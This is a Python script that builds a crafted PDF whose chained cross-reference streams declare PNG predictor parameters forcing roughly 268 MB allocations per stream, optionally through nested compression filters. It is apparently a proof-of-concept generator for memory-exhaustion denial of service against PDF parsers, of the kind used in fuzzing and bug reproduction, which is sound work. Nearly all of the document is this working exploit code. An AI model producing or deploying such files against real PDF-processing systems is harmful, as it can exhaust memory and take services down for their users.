# N xref-stream sections chained by /Prev; each older section's stream has a PNG predictor with
# a ~268 MB row (Columns*Colors*bpc), allocated and zeroed when the stream object is parsed.
# usage: predchain.py N nfilters out.pdf [catalog_in=newest|oldest]
import sys, zlib, struct
N = int(sys.argv[1]); NF = int(sys.argv[2]); out_path = sys.argv[3]; where = sys.argv[4] if len(sys.argv) > 4 else "newest"
objs = {
    1: b"<< /Type /Catalog /Pages 2 0 R >>",
    2: b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    3: b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
    4: b"<< /Length 44 >>\nstream\nBT /F1 12 Tf 72 740 Td (Hello world) Tj ET\nendstream",
    5: b"<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>",
}
out = bytearray(b"%PDF-1.5\n%\xe2\xe3\xcf\xd3\n"); off = {}
for n in sorted(objs):
    off[n] = len(out); out += b"%d 0 obj\n" % n + objs[n] + b"\nendobj\n"
W = 4194303  # Columns; * Colors 32 * 16 bits -> ~268 MB row
def row(t, o, g):
    return bytes([t]) + struct.pack(">I", o) + struct.pack(">H", g)
prev = None
for k in range(N):
    newest = (k == N - 1); oldest = (k == 0)
    num = 100 + k
    if newest:
        # plain stream listing objects; catalog section placement
        listed = [1,2,3,4,5] if where == "newest" else [2,3,4,5]
        rows = b"".join(row(1, off[n], 0) for n in listed)
        idx = b" ".join(b"%d 1" % n for n in listed)
        data = zlib.compress(rows)
        d = b"<< /Type /XRef /Size 200 /Index [%s] /W [1 4 2] /Root 1 0 R /Filter /FlateDecode /Length %d" % (idx, len(data))
    else:
        n_listed = 1 if not (oldest and where == "oldest") else 1
        target = 1 if (oldest and where == "oldest") else 5
        rows = b"\x00" + row(1, off[target], 0)  # PNG 'None' filter byte, then one row (short row)
        data = zlib.compress(rows)
        filt = b"[" + b" ".join([b"/FlateDecode"] * NF) + b"]" if NF > 1 else b"/FlateDecode"
        if NF > 1:
            # nest compression NF times
            for _ in range(NF - 1):
                data = zlib.compress(data)
        parms = b"<< /Predictor 12 /Columns %d /Colors 32 /BitsPerComponent 16 >>" % W
        parmsarr = b"[" + b" ".join([parms] * NF) + b"]" if NF > 1 else parms
        d = b"<< /Type /XRef /Size 200 /Index [%d 1] /W [1 4 2] /Root 1 0 R /Filter %s /DecodeParms %s /Length %d" % (target, filt, parmsarr, len(data))
    if prev is not None:
        d += b" /Prev %d" % prev
    d += b" >>"
    at = len(out)
    out += b"%d 0 obj\n" % num + d + b"\nstream\n" + data + b"\nendstream\nendobj\n"
    prev = at
out += b"startxref\n%d\n%%%%EOF\n" % prev
open(out_path, "wb").write(out)
